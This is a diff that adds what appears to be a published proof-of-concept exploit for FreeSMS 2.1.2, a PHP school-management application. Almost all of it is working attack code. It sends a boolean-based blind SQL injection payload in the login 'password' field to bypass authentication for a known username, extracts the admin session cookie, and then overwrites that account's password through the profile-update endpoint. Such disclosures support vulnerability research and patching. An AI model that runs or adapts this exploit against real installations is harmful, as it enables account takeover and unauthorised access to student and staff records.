@@ -1,0 +1,60 @@
+# Exploit Title: FreeSMS 2.1.2 - Authentication Bypass
+# Date: 2019-04-03
+# Exploit Author: Yilmaz Degirmenci
+# Vendor Homepage: https://freesms.sourceforge.io/
+# Software Link: https://sourceforge.net/projects/freesms/
+# Version: v2.1.2
+# Category: Webapps
+# Tested on: LAMPP for Linux
+# Software Description : FreeSMS is a PHP based application to manage an educational facility 
+# of teachers and students alike. It is a teacher and student management system providing marketing, 
+# registration, course management, attendance and a student evaluation system.
+# ==================================================================
+# The "password" parameter has boolean-based blind SQL injection vulnerability.
+# The login panel can be bypassed if the user name is known.
+# SQLDork: pass") RLIKE (SELECT (CASE WHEN (4404=4404) THEN 0x61646d696e74 ELSE 0x28 END)) AND ("WpaN"="WpaN
+# Exploit allows the creation of a new password on the target.
+
+import requests, sys, re, random
+
+if (len(sys.argv) != 2):
+    print "[*] Usage: poc.py <RHOST><RPATH> (192.168.1.20/freesms)"
+    exit(0)
+
+rhost = sys.argv[1]
+
+uname = str(raw_input("User Name: "))
+npass = str(raw_input("New Pass: "))
+
+url = "http://"+rhost+"/pages/crc_handler.php?method=login"
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+
+data = {"username": ""+uname+"", "password": "pass\") RLIKE (SELECT (CASE WHEN (4404=4404) THEN 0x61646d696e74 ELSE 0x28 END)) AND (\"WpaN\"=\"WpaN", "context": "ou=Don Mills,ou=Toronto,ou=Ontario,ou=Canada,o=CRC World", "login": "login"}
+
+bp = bypass = requests.post(url, headers=headers, data=data)
+
+if bp.status_code == 200:
+  print "Authentication bypass was successful!"
+  print "Trying to change password..."
+else:
+  print "Something went wrong. You should try manual exploitation"
+  sys.exit()
+
+cookies = bypass.headers['Set-Cookie']
+cookie = re.split(r'\s', cookies)[0].replace(';','').replace('crc=','').strip()
+print "Admin Cookie : crc="+cookie+""
+
+
+# Change admin password
+
+purl = "http://"+rhost+"/pages/crc_handler.php?method=profile&func=update"
+pcookies = {"crc": ""+cookie+""}
+pheaders = {"Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}
+pdata={"context": "ou%3DDon+Mills%2Cou%3DToronto%2Cou%3DOntario%2Cou%3DCanada%2Co%3DCRC+World", "profileid": "1", "username": ""+uname+"", "password": ""+npass+"", "fname": "Firstname", "lname": "Lastname", "email": "admin@domain.com", "gender": "Male", "day": "19", "month": "11", "year": "1977", "add1": "Campulung", "add2": '', "city": "Campulung", "province": "AG", "country": "Romania", "pc": "115100", "lcode": "0040", "lprefix": "0000", "lpostfix": "000000", "update": "Update"}
+p = requests.post(purl, headers=pheaders, cookies=pcookies, data=pdata)
+
+if p.status_code == 200:
+  print "New password successfully created! New Password: "+npass+""
+else:
+  print "Something went wrong. You should try manual exploitation"
+  sys.exit()
